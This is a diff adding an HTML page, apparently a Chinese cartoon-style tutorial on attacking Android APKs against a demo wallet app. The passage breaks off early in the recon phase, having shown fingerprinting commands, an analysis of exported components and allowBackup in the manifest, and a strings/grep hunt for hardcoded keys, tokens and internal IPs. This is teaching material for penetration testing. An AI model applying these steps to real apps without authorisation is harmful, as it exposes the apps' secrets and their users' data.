@@ -1,0 +1,2389 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Android APK 攻击全流程 · 卡通工厂全景图</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;700;900&family=Fira+Code:wght@400;600&display=swap');
+
+:root {
+  --bg: #0f0f23;
+  --card: #1a1a2e;
+  --border: #2a2a4a;
+  --text: #e0e0e0;
+  --muted: #888;
+  --shadow: rgba(0,0,0,0.3);
+
+  --c1: #ff6b6b;   /* 侦察 */
+  --c2: #4d96ff;   /* 反编译 */
+  --c3: #ff922b;   /* 代码审计 */
+  --c4: #cc5de8;   /* 动态调试 */
+  --c5: #20c997;   /* 流量劫持 */
+  --c6: #ffd93d;   /* 重打包 */
+
+  --compile: #4d96ff;
+  --package: #20c997;
+  --assemble: #cc5de8;
+}
+
+* { margin:0; padding:0; box-sizing:border-box; }
+
+body {
+  font-family: 'Noto Sans SC', sans-serif;
+  background: var(--bg);
+  color: var(--text);
+  min-height: 100vh;
+  overflow-x: hidden;
+}
+
+/* ===== HEADER ===== */
+.header {
+  text-align: center;
+  padding: 50px 20px 30px;
+  background: linear-gradient(180deg, #1a1a3e 0%, var(--bg) 100%);
+}
+.header h1 { font-size: 2.8em; font-weight: 900; margin-bottom: 8px; }
+.header h1 .rainbow {
+  background: linear-gradient(135deg, #ff6b6b, #4d96ff, #ff922b, #cc5de8, #20c997, #ffd93d);
+  -webkit-background-clip: text;
+  background-clip: text;
+  -webkit-text-fill-color: transparent;
+}
+.header .sub { font-size: 1.05em; color: var(--muted); }
+.header .sample {
+  display: inline-block;
+  margin-top: 16px;
+  font-family: 'Fira Code', monospace;
+  font-size: 0.85em;
+  background: #1a1a2e;
+  border: 1px solid #2a2a4a;
+  border-radius: 10px;
+  padding: 10px 22px;
+  color: #ffd93d;
+}
+.header .disclaimer {
+  margin-top: 14px;
+  font-size: 0.78em;
+  color: #666;
+}
+
+/* ===== 图例 ===== */
+.legend {
+  max-width: 1200px;
+  margin: 20px auto 10px;
+  padding: 0 20px;
+  display: flex;
+  justify-content: center;
+  gap: 18px;
+  flex-wrap: wrap;
+}
+.legend-item {
+  display: flex; align-items: center; gap: 6px;
+  font-size: 0.85em; font-weight: 700; color: #aaa;
+}
+.legend-dot {
+  width: 14px; height: 14px;
+  border-radius: 50%;
+  -webkit-border-radius: 50%;
+}
+
+/* ===== FACTORY ===== */
+.factory {
+  max-width: 1200px;
+  margin: 0 auto;
+  padding: 20px 20px 60px;
+  position: relative;
+}
+
+/* 纵向彩色串联线 */
+.factory::before {
+  content: '';
+  position: absolute;
+  left: 50%;
+  top: 0;
+  bottom: 0;
+  width: 8px;
+  transform: translateX(-50%);
+  background: linear-gradient(to bottom,
+    #8890b0 0%, #8890b0 3%,
+    #ff6b6b 4%,  #ff6b6b 18%,
+    #4d96ff 19%, #4d96ff 37%,
+    #ff922b 38%, #ff922b 58%,
+    #cc5de8 59%, #cc5de8 72%,
+    #20c997 73%, #20c997 86%,
+    #ffd93d 87%, #ffd93d 97%,
+    #ffd93d 97%, #ffd93d 100%
+  );
+  border-radius: 2px;
+  z-index: 0;
+  pointer-events: none;
+}
+
+/* ===== 大步骤分隔 ===== */
+.phase-divider {
+  position: relative;
+  z-index: 1;
+  max-width: 1200px;
+  margin: 40px auto 20px;
+  padding: 0 20px;
+}
+.phase-banner {
+  display: flex;
+  flex-direction: column;
+  gap: 6px;
+  padding: 16px 24px;
+  border-radius: 16px;
+  color: #fff;
+  box-shadow: 0 4px 20px rgba(0,0,0,0.4);
+  position: relative;
+  overflow: hidden;
+}
+.phase-divider.left .phase-banner { margin-right: 230px; }
+.phase-divider.right .phase-banner { margin-left: 230px; }
+.phase-banner .phase-title { font-weight: 900; font-size: 1.3em; }
+.phase-banner .cmd {
+  font-family: 'Fira Code', monospace;
+  font-size: 0.75em;
+  font-weight: 400;
+  background: rgba(0,0,0,0.25);
+  padding: 4px 12px;
+  border-radius: 8px;
+  letter-spacing: 0.5px;
+  white-space: nowrap;
+  align-self: flex-start;
+}
+.phase-banner.p1 { background: linear-gradient(135deg, #ff6b6b, #c92a2a); }
+.phase-banner.p2 { background: linear-gradient(135deg, #4d96ff, #1864ab); }
+.phase-banner.p3 { background: linear-gradient(135deg, #ff922b, #d9480f); }
+.phase-banner.p4 { background: linear-gradient(135deg, #cc5de8, #862e9c); }
+.phase-banner.p5 { background: linear-gradient(135deg, #20c997, #087f5b); }
+.phase-banner.p6 { background: linear-gradient(135deg, #ffd93d, #e67700); color: #1a1a2e; }
+.phase-banner.p6 .cmd { background: rgba(0,0,0,0.18); color: #3a2a00; }
+
+/* ===== STAGE ROW ===== */
+.stage {
+  position: relative;
+  z-index: 2;
+  display: flex;
+  align-items: center;
+  margin-bottom: 50px;
+  gap: 20px;
+}
+.stage.right { flex-direction: row; }
+.stage.left  { flex-direction: row-reverse; }
+
+/* 卡通角色 */
+.character {
+  flex-shrink: 0;
+  width: 120px;
+  text-align: center;
+  position: relative;
+}
+.character svg {
+  width: 100px;
+  height: 120px;
+  filter: drop-shadow(0 4px 8px rgba(0,0,0,0.35));
+}
+.character .char-label {
+  font-size: 0.75em;
+  color: var(--muted);
+  margin-top: 4px;
+  font-weight: 700;
+}
+
+/* 中间连接点 */
+.connector {
+  flex-shrink: 0;
+  width: 70px;
+  min-width: 70px;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  z-index: 3;
+}
+.connector .dot {
+  width: 48px;
+  height: 48px;
+  border-radius: 50%;
+  -webkit-border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 1.2em;
+  font-weight: 900;
+  color: #fff;
+  box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+  -webkit-box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+  position: relative;
+  flex-shrink: 0;
+  animation: bounce 2.5s ease-in-out infinite;
+  -webkit-animation: bounce 2.5s ease-in-out infinite;
+}
+.connector .step-name {
+  font-size: 0.65em;
+  font-weight: 700;
+  margin-top: 4px;
+  text-align: center;
+  color: var(--muted);
+  max-width: 70px;
+}
+@-webkit-keyframes bounce {
+  0%,100% { -webkit-transform: translateY(0) scale(1); }
+  50% { -webkit-transform: translateY(-5px) scale(1.05); }
+}
+@keyframes bounce {
+  0%,100% { transform: translateY(0) scale(1); }
+  50% { transform: translateY(-5px) scale(1.05); }
+}
+
+/* ===== 卡片 ===== */
+.card {
+  flex: 1;
+  background: var(--card);
+  border: 2px solid var(--border);
+  border-radius: 20px;
+  padding: 24px 28px;
+  box-shadow: 0 6px 24px var(--shadow);
+  position: relative;
+  overflow: hidden;
+}
+.card::before {
+  content: '';
+  position: absolute;
+  top: 0; left: 0; right: 0;
+  height: 5px;
+  border-radius: 20px 20px 0 0;
+}
+.card.c1::before { background: var(--c1); }
+.card.c2::before { background: var(--c2); }
+.card.c3::before { background: var(--c3); }
+.card.c4::before { background: var(--c4); }
+.card.c5::before { background: var(--c5); }
+.card.c6::before { background: var(--c6); }
+
+.card h2 {
+  font-size: 1.35em;
+  font-weight: 900;
+  margin-bottom: 3px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  flex-wrap: wrap;
+  color: #fff;
+}
+.card .en { font-size: 0.48em; color: var(--muted); font-weight: 400; }
+.card .parent-tag {
+  font-size: 0.5em;
+  padding: 2px 8px;
+  border-radius: 10px;
+  color: #fff;
+  font-weight: 700;
+  vertical-align: middle;
+}
+.card.c1 .parent-tag { background: var(--c1); }
+.card.c2 .parent-tag { background: var(--c2); }
+.card.c3 .parent-tag { background: var(--c3); }
+.card.c4 .parent-tag { background: var(--c4); }
+.card.c5 .parent-tag { background: var(--c5); color:#04352a; }
+.card.c6 .parent-tag { background: var(--c6); color:#3a2a00; }
+
+.card .desc {
+  color: #aaa;
+  font-size: 0.88em;
+  line-height: 1.7;
+  margin-bottom: 12px;
+}
+.card .desc strong { color: #ddd; }
+
+/* ===== IO 气泡 ===== */
+.io { display: flex; gap: 10px; margin-bottom: 12px; flex-wrap: wrap; }
+.io-box {
+  flex: 1;
+  min-width: 120px;
+  padding: 9px 12px;
+  border-radius: 12px;
+  font-size: 0.8em;
+}
+.io-box.in {
+  background: rgba(77,150,255,0.1);
+  border: 1px dashed rgba(77,150,255,0.4);
+}
+.io-box.out {
+  background: rgba(107,203,119,0.1);
+  border: 1px dashed rgba(107,203,119,0.4);
+}
+.io-box .tag {
+  font-weight: 900;
+  font-size: 0.72em;
+  letter-spacing: 1px;
+  margin-bottom: 2px;
+}
+.io-box.in .tag { color: var(--compile); }
+.io-box.out .tag { color: var(--package); }
+
+/* ===== 代码块 ===== */
+.code {
+  background: #0d0d1a;
+  border: 1px solid #2a2a4a;
+  border-radius: 10px;
+  padding: 12px 14px;
+  font-family: 'Fira Code', monospace;
+  font-size: 0.76em;
+  line-height: 1.8;
+  overflow-x: auto;
+  white-space: pre;
+  color: #ccc;
+  margin-bottom: 8px;
+  position: relative;
+}
+.code .lbl {
+  position: absolute;
+  top: 5px; right: 9px;
+  font-size: 0.68em;
+  color: #555;
+  font-family: 'Noto Sans SC', sans-serif;
+}
+.code .k { color: #cc5de8; }
+.code .t { color: #20c997; }
+.code .f { color: #ffd93d; }
+.code .s { color: #ff922b; }
+.code .c { color: #555; font-style: italic; }
+.code .n { color: #ff6b6b; }
+.code .i { color: #74c0fc; }
+.code .o { color: #e0e0e0; }
+.code .p { color: #f06595; }
+.code .r { color: #6bcb77; }
+.code .e { color: #ff4444; text-decoration: wavy underline; }
+.code .at { color: #ffd93d; }
+
+/* ===== 变形箭头 ===== */
+.transform-arrow {
+  text-align: center;
+  margin: 6px 0;
+  font-size: 1.1em;
+  color: var(--muted);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+}
+.transform-arrow .label {
+  font-size: 0.58em;
+  background: rgba(255,217,61,0.15);
+  color: #ffd93d;
+  padding: 2px 10px;
+  border-radius: 20px;
+  font-weight: 700;
+}
+
+/* ===== 知识点标签 ===== */
+.tips { margin-top: 6px; }
+.tip {
+  display: inline-block;
+  padding: 4px 11px;
+  border-radius: 18px;
+  font-size: 0.76em;
+  margin: 2px 2px 2px 0;
+  font-weight: 600;
+}
+.tip.info {
+  background: rgba(255,217,61,0.1);
+  color: #ffd93d;
+  border: 1px solid rgba(255,217,61,0.3);
+}
+.tip.info::before { content: '💡 '; }
+.tip.warn {
+  background: rgba(255,107,107,0.1);
+  color: #ff6b6b;
+  border: 1px solid rgba(255,107,107,0.3);
+}
+.tip.warn::before { content: '⚠️ '; }
+.tip.pwn {
+  background: rgba(32,201,151,0.1);
+  color: #20c997;
+  border: 1px solid rgba(32,201,151,0.3);
+}
+.tip.pwn::before { content: '☠️ '; }
+
+/* ===== 漫画气泡 ===== */
+.bubble {
+  position: absolute;
+  top: -32px;
+  left: 50%;
+  transform: translateX(-50%);
+  background: #252545;
+  border: 2px solid var(--border);
+  border-left: 4px solid var(--compile);
+  border-radius: 10px;
+  padding: 6px 14px;
+  font-size: 0.78em;
+  font-weight: 700;
+  color: #fff;
+  z-index: 10;
+  white-space: nowrap;
+}
+.bubble::after {
+  content: '';
+  position: absolute;
+  bottom: -8px;
+  left: 50%;
+  margin-left: -7px;
+  width: 0; height: 0;
+  border-left: 7px solid transparent;
+  border-right: 7px solid transparent;
+  border-top: 8px solid var(--border);
+}
+.bubble.b1 { border-left-color: var(--c1); }
+.bubble.b2 { border-left-color: var(--c2); }
+.bubble.b3 { border-left-color: var(--c3); }
+.bubble.b4 { border-left-color: var(--c4); }
+.bubble.b5 { border-left-color: var(--c5); }
+.bubble.b6 { border-left-color: var(--c6); }
+.bubble.bs { border-left-color: #8890b0; }
+
+/* ===== SUMMARY ===== */
+.summary {
+  max-width: 1200px;
+  margin: 30px auto 40px;
+  padding: 0 20px;
+}
+.summary h2 {
+  text-align: center;
+  font-size: 1.7em;
+  margin-bottom: 16px;
+  background: linear-gradient(135deg, var(--assemble), var(--package));
+  -webkit-background-clip: text;
+  background-clip: text;
+  -webkit-text-fill-color: transparent;
+}
+.summary table {
+  width: 100%;
+  border-collapse: collapse;
+  background: var(--card);
+  border-radius: 16px;
+  overflow: hidden;
+}
+.summary th {
+  background: #222244;
+  padding: 14px 14px;
+  text-align: left;
+  font-size: 0.88em;
+  color: #aaa;
+  font-weight: 700;
+}
+.summary td {
+  padding: 13px 14px;
+  border-bottom: 1px solid var(--border);
+  font-size: 0.85em;
+  vertical-align: top;
+  line-height: 1.6;
+}
+.summary tr:last-child td { border-bottom: none; }
+.summary .dot {
+  display: inline-block;
+  width: 10px; height: 10px;
+  border-radius: 50%;
+  -webkit-border-radius: 50%;
+  margin-right: 5px;
+  vertical-align: middle;
+}
+
+/* ===== FOOTER ===== */
+.footer {
+  text-align: center;
+  padding: 25px 20px;
+  color: #444;
+  font-size: 0.8em;
+  border-top: 1px solid #2a2a4a;
+  max-width: 1200px;
+  margin: 0 auto;
+  line-height: 1.8;
+}
+
+/* ===== RESPONSIVE ===== */
+@media (max-width: 800px) {
+  .stage, .stage.left, .stage.right { flex-direction: column !important; align-items: center; }
+  .character { display: none; }
+  .connector { flex-direction: column; gap: 4px; }
+  .header h1 { font-size: 1.6em; }
+  .card { padding: 16px; max-width: 100%; min-width: auto; margin: 0 10px !important; }
+  .factory::before { display: none; }
+  .phase-divider { display: none; }
+  .legend { gap: 10px; flex-wrap: wrap; }
+  .io { flex-wrap: wrap; }
+  .tips { flex-wrap: wrap; }
+  .summary { overflow-x: auto; }
+  .summary table { min-width: 700px; }
+  .code { overflow-x: auto; }
+}
+</style>
+</head>
+<body>
+
+<div class="header">
+  <h1><span class="rainbow">Android APK 攻击全流程</span></h1>
+  <div class="sub">从一个 4.2 MB 的安装包，到整个后端沦陷 —— 六阶段 29 步</div>
+  <div class="sample">贯穿样本：demo-wallet.apk &nbsp;·&nbsp; com.vuln.wallet &nbsp;·&nbsp; v2.3.1</div>
+  <div class="disclaimer">⚠️ 仅用于授权渗透测试与安全评估 · 未授权攻击他人应用属违法行为</div>
+</div>
+
+<div class="legend">
+  <div class="legend-item"><span class="legend-dot" style="background:#ff6b6b"></span>① 静态侦察</div>
+  <div class="legend-item"><span class="legend-dot" style="background:#4d96ff"></span>② 脱壳反编译</div>
+  <div class="legend-item"><span class="legend-dot" style="background:#ff922b"></span>③ 代码审计</div>
+  <div class="legend-item"><span class="legend-dot" style="background:#cc5de8"></span>④ 动态调试</div>
+  <div class="legend-item"><span class="legend-dot" style="background:#20c997"></span>⑤ 流量劫持</div>
+  <div class="legend-item"><span class="legend-dot" style="background:#ffd93d"></span>⑥ 重打包投毒</div>
+</div>
+
+<div class="factory">
+
+  <!-- ==================== S ==================== -->
+  <div class="stage right">
+    <div class="character">
+      <div class="bubble bs">就你了，让我看看你藏了什么</div>
+      <svg viewBox="0 0 100 120">
+        <line x1="50" y1="12" x2="50" y2="24" stroke="#8890b0" stroke-width="3"/>
+        <circle cx="50" cy="9" r="5" fill="#8890b0"/>
+        <rect x="24" y="22" width="52" height="42" rx="12" fill="#8890b0"/>
+        <circle cx="39" cy="41" r="6" fill="#0f0f23"/>
+        <circle cx="61" cy="41" r="6" fill="#0f0f23"/>
+        <circle cx="41" cy="39" r="2" fill="#fff"/>
+        <circle cx="63" cy="39" r="2" fill="#fff"/>
+        <rect x="40" y="53" width="20" height="4" rx="2" fill="#0f0f23" opacity="0.5"/>
+        <rect x="26" y="68" width="48" height="34" rx="8" fill="#1f1f3a" stroke="#8890b0" stroke-width="3"/>
+        <text x="50" y="90" text-anchor="middle" font-size="11" font-weight="900" fill="#8890b0" font-family="monospace">APK</text>
+        <line x1="26" y1="76" x2="12" y2="86" stroke="#8890b0" stroke-width="4" stroke-linecap="round"/>
+        <line x1="74" y1="76" x2="88" y2="86" stroke="#8890b0" stroke-width="4" stroke-linecap="round"/>
+        <rect x="82" y="80" width="14" height="18" rx="3" fill="none" stroke="#8890b0" stroke-width="3"/>
+        <line x1="38" y1="102" x2="38" y2="112" stroke="#8890b0" stroke-width="4" stroke-linecap="round"/>
+        <line x1="62" y1="102" x2="62" y2="112" stroke="#8890b0" stroke-width="4" stroke-linecap="round"/>
+      </svg>
+      <div class="char-label">黑盒</div>
+    </div>
+    <div class="connector">
+      <div class="dot" style="background:#8890b0">S</div>
+      <div class="step-name">拿到 APK</div>
+    </div>
+    <div class="card">
+      <h2>🎯 起点：目标文件 <span class="en">The Target</span></h2>
+      <div class="desc">手上只有一个 <strong>demo-wallet.apk</strong>。不知道包名、不知道代码、不知道后端地址、不知道有没有加固。<strong>一切从零开始</strong>——攻击面 = 代码 + 资源 + Native + 网络 + 运行时。</div>
+      <div class="io">
+        <div class="io-box in"><div class="tag">📥 输入</div>一个二进制安装包</div>
+        <div class="io-box out"><div class="tag">📤 输出</div>一个待解剖的黑盒</div>
+      </div>
+      <div class="transform-arrow">⬇️ <span class="label">目标锁定 · 进入解剖</span> ⬇️</div>
+      <div class="code"><span class="lbl">目标</span>
+demo-wallet.apk   <span class="n">4.2 MB</span>   <span class="c">← 全部线索都封在里面</span>
+</div>
+      <div class="tips">
+        <span class="tip info">客户端的一切都是可逆的：代码、密钥、算法、协议</span>
+        <span class="tip info">六阶段：侦察 → 反编译 → 审计 → 动态 → 流量 → 投毒</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ==================== PHASE 1 ==================== -->
+  <div class="phase-divider left">
+    <div class="phase-banner p1">
+      <div class="phase-title">🔍 ① 静态侦察 Static Recon</div>
+      <div class="cmd">$ file demo-wallet.apk &amp;&amp; apksigner verify --print-certs demo-wallet.apk</div>
+    </div>
+  </div>
+
+  <!-- 1a -->
+  <div class="stage left">
+    <div class="character">
+      <div class="bubble b1">先按个指纹，跑不掉的</div>
+      <svg viewBox="0 0 100 120">
+        <line x1="50" y1="12" x2="50" y2="24" stroke="#ff6b6b" stroke-width="3"/>
+        <circle cx="50" cy="9" r="5" fill="#ff6b6b"/>
+        <rect x="24" y="22" width="52" height="42" rx="12" fill="#ff6b6b"/>
+        <circle cx="39" cy="41" r="6" fill="#0f0f23"/><circle cx="61" cy="41" r="6" fill="#0f0f23"/>
+        <circle cx="41" cy="39" r="2" fill="#fff"/><circle cx="63" cy="39" r="2" fill="#fff"/>
+        <rect x="40" y="53" width="20" height="4" rx="2" fill="#0f0f23" opacity="0.5"/>
+        <rect x="26" y="68" width="48" height="34" rx="8" fill="#1f1f3a" stroke="#ff6b6b" stroke-width="3"/>
+        <text x="50" y="90" text-anchor="middle" font-size="10" font-weight="900" fill="#ff6b6b" font-family="monospace">HASH</text>
+        <line x1="26" y1="76" x2="12" y2="88" stroke="#ff6b6b" stroke-width="4" stroke-linecap="round"/>
+        <line x1="74" y1="76" x2="88" y2="82" stroke="#ff6b6b" stroke-width="4" stroke-linecap="round"/>
+        <circle cx="88" cy="90" r="7" fill="none" stroke="#ff6b6b" stroke-width="3"/>
+        <line x1="93" y1="95" x2="98" y2="100" stroke="#ff6b6b" stroke-width="3" stroke-linecap="round"/>
+        <line x1="38" y1="102" x2="38" y2="112" stroke="#ff6b6b" stroke-width="4" stroke-linecap="round"/>
+        <line x1="62" y1="102" x2="62" y2="112" stroke="#ff6b6b" stroke-width="4" stroke-linecap="round"/>
+      </svg>
+      <div class="char-label">指纹员</div>
+    </div>
+    <div class="connector">
+      <div class="dot" style="background:#ff6b6b">1a</div>
+      <div class="step-name">文件指纹</div>
+    </div>
+    <div class="card c1">
+      <h2>🪪 文件指纹 <span class="en">Fingerprint</span> <span class="parent-tag">① 侦察</span></h2>
+      <div class="desc">不装、不改、不运行。先给文件<strong>验明正身</strong>：算哈希锁定样本、读 ZIP 结构、提取签名者信息，判断是否被二次打包过。</div>
+      <div class="io">
+        <div class="io-box in"><div class="tag">📥 输入</div>demo-wallet.apk</div>
+        <div class="io-box out"><div class="tag">📤 输出</div>SHA-256 / 打包特征 / 签名主体</div>
+      </div>
+      <div class="transform-arrow">⬇️ <span class="label">只读不跑 · 提取元数据</span> ⬇️</div>
+      <div class="code"><span class="lbl">终端</span>
+$ file demo-wallet.apk
+demo-wallet.apk: <span class="t">Zip archive data</span>, v2.0
+
+$ shasum -a 256 demo-wallet.apk
+<span class="r">a3f1c9e2...b71d</span>   <span class="c">← 样本唯一身份证</span>
+
+$ unzip -l demo-wallet.apk | head -6
+  classes.dex        <span class="n">2,148,332</span>
+  resources.arsc       <span class="n">892,104</span>
+  lib/arm64-v8a/libnative-lib.so
+
+$ apksigner verify --print-certs demo-wallet.apk
+Signer #1: <span class="s">CN=Demo Wallet, O=VulnLab</span>
+</div>
+      <div class="tips">
+        <span class="tip info">SHA-256 是样本的全球唯一标识，用于情报比对</span>
+        <span class="tip warn">签名是 v1 还是 v2/v3，决定后面重打包的绕过难度</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 1b -->
+  <div class="stage right">
+    <div class="character">
+      <div class="bubble b1">这门口怎么连个锁都没有？</div>
+      <svg viewBox="0 0 100 120">
+        <line x1="50" y1="12" x2="50" y2="24" stroke="#ff6b6b" stroke-width="3"/>
+        <circle cx="50" cy="9" r="5" fill="#ff6b6b"/>
+        <rect x="24" y="22" width="52" height="42" rx="12" fill="#ff6b6b"/>
+        <circle cx="39" cy="41" r="6" fill="#0f0f23"/><circle cx="61" cy="41" r="6" fill="#0f0f23"/>
+        <circle cx="41" cy="39" r="2" fill="#fff"/><circle cx="63" cy="39" r="2" fill="#fff"/>
+        <rect x="40" y="53" width="20" height="4" rx="2" fill="#0f0f23" opacity="0.5"/>
+        <rect x="26" y="68" width="48" height="34" rx="8" fill="#1f1f3a" stroke="#ff6b6b" stroke-width="3"/>
+        <text x="50" y="90" text-anchor="middle" font-size="10" font-weight="900" fill="#ff6b6b" font-family="monospace">XML</text>
+        <line x1="26" y1="76" x2="10" y2="82" stroke="#ff6b6b" stroke-width="4" stroke-linecap="round"/>
+        <line x1="74" y1="76" x2="88" y2="82" stroke="#ff6b6b" stroke-width="4" stroke-linecap="round"/>
+        <rect x="84" y="76" width="14" height="18" rx="3" fill="none" stroke="#ff6b6b" stroke-width="3"/>
+        <circle cx="91" cy="83" r="2.5" fill="#ff6b6b"/>
+        <line x1="38" y1="102" x2="38" y2="112" stroke="#ff6b6b" stroke-width="4" stroke-linecap="round"/>
+        <line x1="62" y1="102" x2="62" y2="112" stroke="#ff6b6b" stroke-width="4" stroke-linecap="round"/>
+      </svg>
+      <div class="char-label">门禁员</div>
+    </div>
+    <div class="connector">
+      <div class="dot" style="background:#ff6b6b">1b</div>
+      <div class="step-name">清单解剖</div>
+    </div>
+    <div class="card c1">
+      <h2>🗺️ 清单解剖 <span class="en">Manifest Teardown</span> <span class="parent-tag">① 侦察</span></h2>
+      <div class="desc">AndroidManifest.xml 就是<strong>攻击地图</strong>。重点找四样东西：<strong>exported 组件</strong>（谁能从外部喊它）、<strong>危险权限</strong>、<strong>scheme 深链</strong>、<strong>allowBackup / cleartextTraffic</strong>。</div>
+      <div class="io">
+        <div class="io-box in"><div class="tag">📥 输入</div>二进制 AXML</div>
+        <div class="io-box out"><div class="tag">📤 输出</div>攻击入口清单 / 权限面 / 深链路径</div>
+      </div>
+      <div class="transform-arrow">⬇️ <span class="label">AXML 解码 · 提取攻击面</span> ⬇️</div>
+      <div class="code"><span class="lbl">AndroidManifest.xml</span>
+<span class="k">&lt;manifest</span> <span class="at">xmlns:android</span>=<span class="s">"http://schemas.android.com/apk/res/android"</span>
+          <span class="at">package</span>=<span class="s">"com.vuln.wallet"</span> <span class="at">android:versionName</span>=<span class="s">"2.3.1"</span><span class="k">&gt;</span>
+  <span class="k">&lt;uses-permission</span> <span class="at">android:name</span>=<span class="s">"android.permission.READ_SMS"</span><span class="k">/&gt;</span>
+
+  <span class="k">&lt;application</span> <span class="at">android:allowBackup</span>=<span class="s">"true"</span>          <span class="c">← adb backup 拖数据</span>
+               <span class="at">android:usesCleartextTraffic</span>=<span class="s">"true"</span><span class="k">&gt;</span>  <span class="c">← 允许明文 HTTP</span>
+    <span class="k">&lt;activity</span> <span class="at">android:name</span>=<span class="s">".ui.WebActivity"</span>
+              <span class="at">android:exported</span>=<span class="s">"true"</span><span class="k">&gt;</span>      <span class="e">← 对外裸奔</span>
+      <span class="k">&lt;intent-filter&gt;</span>
+        <span class="k">&lt;action</span> <span class="at">android:name</span>=<span class="s">"android.intent.action.VIEW"</span><span class="k">/&gt;</span>
+        <span class="k">&lt;category</span> <span class="at">android:name</span>=<span class="s">"android.intent.category.BROWSABLE"</span><span class="k">/&gt;</span>
+        <span class="k">&lt;category</span> <span class="at">android:name</span>=<span class="s">"android.intent.category.DEFAULT"</span><span class="k">/&gt;</span>
+        <span class="k">&lt;data</span> <span class="at">android:scheme</span>=<span class="s">"vulnwallet"</span><span class="k">/&gt;</span>
+      <span class="k">&lt;/intent-filter&gt;</span>
+    <span class="k">&lt;/activity&gt;</span>
+  <span class="k">&lt;/application&gt;</span>
+<span class="k">&lt;/manifest&gt;</span>
+</div>
+      <div class="tips">
+        <span class="tip warn">exported=true 且无 permission 保护 = 任意 App 可调用</span>
+        <span class="tip warn">allowBackup=true → <code>adb backup</code> 直接拖走私有数据</span>
+        <span class="tip info">深链 scheme 可被任意网页/短信唤起 → 钓鱼入口</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 1c -->
+  <div class="stage left">
+    <div class="character">
+      <div class="bubble b1">哦豁，内网 IP 都写脸上了</div>
+      <svg viewBox="0 0 100 120">
+        <line x1="50" y1="12" x2="50" y2="24" stroke="#ff6b6b" stroke-width="3"/>
+        <circle cx="50" cy="9" r="5" fill="#ff6b6b"/>
+        <rect x="24" y="22" width="52" height="42" rx="12" fill="#ff6b6b"/>
+        <circle cx="39" cy="41" r="6" fill="#0f0f23"/><circle cx="61" cy="41" r="6" fill="#0f0f23"/>
+        <circle cx="41" cy="39" r="2" fill="#fff"/><circle cx="63" cy="39" r="2" fill="#fff"/>
+        <rect x="40" y="53" width="20" height="4" rx="2" fill="#0f0f23" opacity="0.5"/>
+        <rect x="26" y="68" width="48" height="34" rx="8" fill="#1f1f3a" stroke="#ff6b6b" stroke-width="3"/>
+        <text x="50" y="90" text-anchor="middle" font-size="10" font-weight="900" fill="#ff6b6b" font-family="monospace">STR</text>
+        <line x1="26" y1="76" x2="12" y2="86" stroke="#ff6b6b" stroke-width="4" stroke-linecap="round"/>
+        <line x1="74" y1="76" x2="90" y2="80" stroke="#ff6b6b" stroke-width="4" stroke-linecap="round"/>
+        <line x1="84" y1="74" x2="98" y2="88" stroke="#ff6b6b" stroke-width="3" stroke-linecap="round"/>
+        <line x1="98" y1="74" x2="84" y2="88" stroke="#ff6b6b" stroke-width="3" stroke-linecap="round"/>
+        <line x1="38" y1="102" x2="38" y2="112" stroke="#ff6b6b" stroke-width="4" stroke-linecap="round"/>
+        <line x1="62" y1="102" x2="62" y2="112" stroke="#ff6b6b" stroke-width="4" stroke-linecap="round"/>
+      </svg>
+      <div class="char-label">拾荒者</div>
+    </div>
+    <div class="connector">
+      <div class="dot" style="background:#ff6b6b">1c</div>
+      <div class="step-name">字符串搜集</div>
+    </div>
+    <div class="card c1">
+      <h2>🧲 字符串与资源搜集 <span class="en">Strings Harvest</span> <span class="parent-tag">① 侦察</span></h2>
+      <div class="desc">二进制里的"碎纸机"——硬编码 URL、密钥、内网 IP、测试账号、注释残留，全都能被 <code>strings</code> 捞出来。<strong>零成本、高回报</strong>的一步。</div>
+      <div class="io">
+        <div class="io-box in"><div class="tag">📥 输入</div>classes.dex / resources.arsc</div>
+        <div class="io-box out"><div class="tag">📤 输出</div>后端地址 / 疑似密钥 / 内网资产</div>
+      </div>
+      <div class="transform-arrow">⬇️ <span class="label">从二进制中捞出明文</span> ⬇️</div>
+      <div class="code"><span class="lbl">终端</span>
+$ strings classes.dex | grep -Ei <span class="s">'http|key|token|pass'</span>
+<span class="r">http://api.vuln.internal:8080/api/login</span>   <span class="c">← 后端入口</span>
+<span class="e">AES_KEY = "1234567890abcdef"</span>              <span class="c">← 硬编码密钥</span>
+<span class="e">debug_token = "test-admin-2023"</span>            <span class="c">← 测试凭据</span>
+<span class="r">10.20.30.41:6379</span>                             <span class="c">← 内网 Redis</span>
+
+$ unzip -p demo-wallet.apk resources.arsc | strings | grep vuln
+<span class="s">vulnwallet://web?url=</span>                        <span class="c">← 深链模板</span>
+</div>
+      <div class="tips">
+        <span class="tip warn">硬编码密钥是移动端最高频的高危问题</span>
+        <span class="tip info">内网地址 = 后续横向渗透的桥头堡</span>
+        <span class="tip info">先用 strings 快速侦察，再进反编译精读</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 1d -->
+  <div class="stage right">
+    <div class="character">
+      <div class="bubble b1">没穿甲，那就好办了</div>
+      <svg viewBox="0 0 100 120">
+        <line x1="50" y1="12" x2="50" y2="24" stroke="#ff6b6b" stroke-width="3"/>
+        <circle cx="50" cy="9" r="5" fill="#ff6b6b"/>
+        <rect x="24" y="22" width="52" height="42" rx="12" fill="#ff6b6b"/>
+        <circle cx="39" cy="41" r="6" fill="#0f0f23"/><circle cx="61" cy="41" r="6" fill="#0f0f23"/>
+        <circle cx="41" cy="39" r="2" fill="#fff"/><circle cx="63" cy="39" r="2" fill="#fff"/>
+        <rect x="40" y="53" width="20" height="4" rx="2" fill="#0f0f23" opacity="0.5"/>
+        <rect x="26" y="68" width="48" height="34" rx="8" fill="#1f1f3a" stroke="#ff6b6b" stroke-width="3"/>
+        <text x="50" y="90" text-anchor="middle" font-size="10" font-weight="900" fill="#ff6b6b" font-family="monospace">SHELL</text>
